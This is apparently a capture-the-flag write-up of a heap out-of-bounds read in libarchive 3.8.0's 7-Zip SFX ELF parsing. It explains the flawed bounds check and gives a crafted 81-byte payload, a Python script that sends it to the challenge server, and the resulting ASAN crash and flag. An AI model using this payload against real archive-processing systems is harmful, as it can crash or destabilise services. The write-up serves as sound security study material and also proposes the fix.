# VULN#007 — libarchive 3.8.0 7-Zip SFX ELF OOB Read

**Challenge:** VULN#007 (82 pts)
**Target:** 169.58.126.107:7031
**Flag:** `CTF{d1644621477661ffdb452d8b4c5394ba}`

## Service behavior

The service accepts a TCP connection, reads a 4-byte big-endian length
prefix, then reads that many bytes as an archive file. It loads the
archive with the **unmodified libarchive 3.8.0** library (from the
uploaded `freetype-src.tar.gz`… actually `libarchive-src.tar.gz`),
lists entries via the standard `archive_read_open_memory` →
`archive_read_next_header` loop, and replies with either
`status: not valid` (no crash) or `status: crash confirmed (...)`
plus the flag (ASAN detected a memory error).

## Vulnerability

Located in `libarchive/archive_read_support_format_7zip.c`, function
`find_elf_data_sec()` (line 742). This function is invoked from the
7-Zip format bidder (line 557) when the input begins with `\x7FELF`
(POSIX 7-Zip SFX) or `MZ` (Windows PE SFX). Its job is to locate the
embedded 7-Zip data section by parsing the ELF section header table.

### The bug

```c
e_shoff     = (*dec32)(h + 0x20);
e_shentsize = (*dec16)(h + 0x2E);
e_shnum     = (*dec16)(h + 0x30);
e_shstrndx  = (*dec16)(h + 0x32);

/* BUG: only checks e_shnum < e_shstrndx, allows e_shnum == e_shstrndx */
if (e_shnum < e_shstrndx || e_shentsize < 0x18)
    break;

if (__archive_read_seek(a, e_shoff, SEEK_SET) < 0)
    break;

/* Reserves exactly e_shnum * e_shentsize bytes */
h = __archive_read_ahead(a, (size_t)e_shnum * (size_t)e_shentsize, NULL);
if (h == NULL)
    break;

/* Reads at h + e_shstrndx * e_shentsize + 0x10 and + 0x14 */
strtab_offset = (*dec32)(h + e_shstrndx * e_shentsize + 0x10);
strtab_size   = (*dec32)(h + e_shstrndx * e_shentsize + 0x14);
```

When `e_shnum == e_shstrndx` (which passes the `<` check), the index
`e_shstrndx * e_shentsize` equals the full reserved buffer size
`e_shnum * e_shentsize`. Adding `0x10` or `0x14` then reads **past the
end** of the buffer returned by `__archive_read_ahead`. With ASAN
enabled and the file loaded via `archive_read_open_memory` (single
heap allocation), those reads land in the heap redzone and crash the
process.

### Why the check is insufficient

The guard `e_shnum < e_shstrndx` rejects `e_shstrndx` strictly greater
than `e_shnum`, but the section-header-table indexing convention allows
`e_shstrndx == e_shnum` to mean "no string table" — and even when that
isn't the intended meaning, the code goes on to dereference
`h + e_shstrndx * e_shentsize + 0x14`, which is only valid when
`e_shstrndx < e_shnum` (strictly). The correct check should be
`e_shnum <= e_shstrndx` (i.e., reject `e_shstrndx >= e_shnum`).

## Exploit construction

We craft an 81-byte ELF32 little-endian file that libarchive's
7-Zip bidder recognises as a potential SFX archive and hands to
`find_elf_data_sec()`. The ELF header fields are set so that:

| Field        | Value      | Effect |
| ------------ | ---------- | ------ |
| `e_ident`    | `\x7FELF` + class32 + LE | triggers `find_elf_data_sec` |
| `e_shoff`    | `0`        | seek to start of file (so `h = buf`) |
| `e_shentsize`| `0x49` (73)| ≥ 0x18, passes check |
| `e_shnum`    | `1`        | reserves 1 × 73 = 73 bytes via `__archive_read_ahead` |
| `e_shstrndx` | `1`        | equals `e_shnum`, passes the `<` check |

After `__archive_read_ahead(73)` returns `h = buf` (the 81-byte heap
allocation), the code computes:

```
strtab_offset = le32(h + 1*73 + 0x10) = le32(buf + 89)   ← past the 81-byte allocation
strtab_size   = le32(h + 1*73 + 0x14) = le32(buf + 93)   ← past the 81-byte allocation
```

Both reads are in the ASAN redzone. The first one (`le32(buf + 89)`)
triggers:

```
==PID== ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 4 at 0x... offset 89 in 81-byte region
```

The service wrapper detects the ASAN crash and returns:

```
status: crash confirmed (heap-buffer-overflow in 7zip SFX detection)
FLAG: CTF{d1644621477661ffdb452d8b4c5394ba}
```

## Full exploit (81 bytes)

```python
#!/usr/bin/env python3
import socket, struct

HOST, PORT = "169.58.126.107", 7031

def build_7z():
    """ELF32 LE crafted as 7-Zip SFX, deliberately truncated.
    e_shoff=0, e_shentsize=0x49, e_shnum=1, e_shstrndx=1.
    __archive_read_ahead(73) returns buf; then le32(buf+89) reads
    past the 81-byte allocation into the ASAN redzone.
    """
    return bytes.fromhex(
        "7f454c46010101006000000840000000000000003200000034002000010000"
        "0000000000000000000000000000474900010001000000504b0070ff7f0000"
        "00000000000008000000b801000000cd800000"
    )

data = build_7z()
msg = struct.pack(">I", len(data)) + data
s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(8)
s.sendall(msg)
out = b""
try:
    while True:
        c = s.recv(8192)
        if not c: break
        out += c
except socket.timeout: pass
s.close()
print(out.decode(errors="replace"))
```

## Output

```
status: crash confirmed (heap-buffer-overflow in 7zip SFX detection)
FLAG: CTF{d1644621477661ffdb452d8b4c5394ba}
```

## Key takeaways

- libarchive 3.8.0's 7-Zip SFX ELF parser (`find_elf_data_sec`)
  accepts `e_shstrndx == e_shnum`, which makes the section-header-table
  index `e_shstrndx * e_shentsize` equal to the full reserved buffer
  size. The subsequent `+ 0x10` / `+ 0x14` field reads then walk past
  the buffer.
- The check `e_shnum < e_shstrndx` should be `e_shnum <= e_shstrndx`
  (or, equivalently, the field reads should be guarded by
  `(e_shstrndx + 1) * e_shentsize <= e_shnum * e_shentsize`).
- With ASAN + `archive_read_open_memory`, the file lives in a single
  heap allocation, so any over-read past `buf + len` immediately lands
  in the redzone and crashes the process — no need to control the leak
  content or chain the bug.
- The fix was merged upstream in commit `dc6c0c5f` (post-3.8.0).
